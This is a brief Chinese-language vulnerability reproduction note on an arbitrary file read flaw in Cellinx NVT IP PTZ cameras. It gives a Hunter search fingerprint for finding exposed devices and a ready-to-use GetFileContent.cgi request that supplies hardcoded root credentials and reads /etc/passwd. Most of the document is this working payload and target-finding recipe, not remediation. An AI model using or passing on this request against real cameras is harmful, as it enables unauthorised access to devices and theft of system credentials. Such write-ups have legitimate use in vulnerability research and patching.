# Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞

# 一、漏洞简介
Cellinx NVT IP PTZ是韩国Cellinx公司的一个摄像机设备。Cellinx NVT v1.0.6.002b版本存在安全漏洞，该漏洞源于存在本地文件泄露漏洞，攻击者可读取系统密码等敏感信息。

# 二、影响版本
+ Cellinx NVT 摄像机 

# 三、资产测绘
+ hunter`web.body="local/NVT-string.js"`
+ 特征

![1700147527163-e3d6c796-662b-461d-a2d8-c879b388bfb5.png](./img/qqGC1EAYOXIL_3Db/1700147527163-e3d6c796-662b-461d-a2d8-c879b388bfb5-628657.png)

# 四、漏洞复现
```plain
/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
```

![1700147551526-19a4ef00-9add-4be1-af80-70fe238bd21c.png](./img/qqGC1EAYOXIL_3Db/1700147551526-19a4ef00-9add-4be1-af80-70fe238bd21c-591022.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hy0qp46w1tuklewg>